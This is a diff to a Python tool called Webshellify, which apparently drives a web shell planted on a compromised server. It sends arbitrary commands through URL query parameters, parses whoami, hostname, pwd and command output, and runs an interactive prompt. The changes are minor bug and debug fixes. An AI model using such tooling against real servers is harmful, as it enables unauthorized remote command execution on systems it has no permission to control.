@@ -75,8 +75,8 @@ class Webshellify:
 
         commands += f"echo '`{self.delimiter}-user`'; whoami; echo '`/{self.delimiter}-user`';"
         commands += f"echo '`{self.delimiter}-host`'; uname -n; echo '`/{self.delimiter}-host`'"
-        commands += f"echo '`{self.delimiter}-wd`'; pwd; echo '`/{self.delimiter}-wd`'"
         commands += f"echo '`{self.delimiter}`'; {command}; echo '`/{self.delimiter}`'"
+        commands += f"echo '`{self.delimiter}-wd`'; pwd; echo '`/{self.delimiter}-wd`'"
         return commands
 
     """
@@ -108,9 +108,9 @@ wd regex: {wd_regex}
 match: {wd_re.findall(raw)}
 output regex: {output_regex}
 match: {output_re.findall(raw)}""")
-        user = user_re.findall(raw)[0][0]
-        workdir = wd_re.findall(raw)[0][0]
-        output = output_re.findall(raw)[0][0]
+        user = user_re.findall(raw)[0][0][:-1]
+        workdir = wd_re.findall(raw)[0][0][:-1]
+        output = output_re.findall(raw)[0][0][:-1]
         return user, workdir, output
 
     """
@@ -129,7 +129,7 @@ match: {output_re.findall(raw)}""")
     user and the output of the previous command
     """
     def send_command(self, command, chdir=False):
-        cmd = self.__gen_command(command)
+        cmd = self.__gen_command(command, chdir=chdir)
         # generate query
         query_str = "?"
         for key, value in enumerate(self.queries):
@@ -196,7 +196,7 @@ headers: {self.headers}
         while(True):
             try:
                 current_dir = self.workdir.split('/')[-1]
-                shell_prompt = f"{self.user}@{self.host} : {current_dir} >"
+                shell_prompt = f"{self.user}@{self.host} : {current_dir} > "
                 command = input(shell_prompt)
 
                 if(" .." in command):
@@ -205,7 +205,10 @@ headers: {self.headers}
                 if(" ." in command):
                     command.replace(" .", f" {self.workdir}")
 
-                user, workdir, output = self.send_command(command)
+                if(self.debug):
+                    print(f"[debug] in funct `create_shell`\nworking directory : {self.workdir}\nparent directory : {self.parentdir}")
+
+                user, workdir, output = self.send_command(command, chdir=True)
                 self.user = user
                 self.workdir = workdir
                 self.parentdir = self.__get_parent_dir(workdir)
